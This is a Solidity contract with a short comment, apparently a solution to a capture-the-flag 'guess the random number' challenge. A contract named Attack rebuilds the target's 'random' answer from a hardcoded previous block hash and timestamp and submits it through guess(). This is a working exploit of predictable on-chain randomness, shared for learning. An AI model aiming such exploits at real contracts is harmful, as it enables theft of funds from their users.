/*
    This one was quite easy if you really know the basics that nothing on the blockchain is truly random, and everything is public

    Well, our task now is to guess the number using previousBlockHash and previousTimestamp..

    For this, we be using our own contract, after deploying the original question contract, just copy both the previousHash and previousTimestamp and then paste it in our code..

    This code is just calling the function of the original contract..

    Cheers!
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface IGuessTheRandomNumber{
    function guess(uint8) external;
}

contract Attack{
    IGuessTheRandomNumber public target;

    bytes32 public previousBlockHash = 0x46bb038bc6e10f527edcb889df35ffd3b903453d41b11f1d14e538459b90cdc7;
    uint public previousTimestamp = 1641520092;

    constructor(address victim){
        target = IGuessTheRandomNumber(victim);
    }

    function solve() external{
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(previousBlockHash, previousTimestamp))));
        target.guess(answer);
    }
}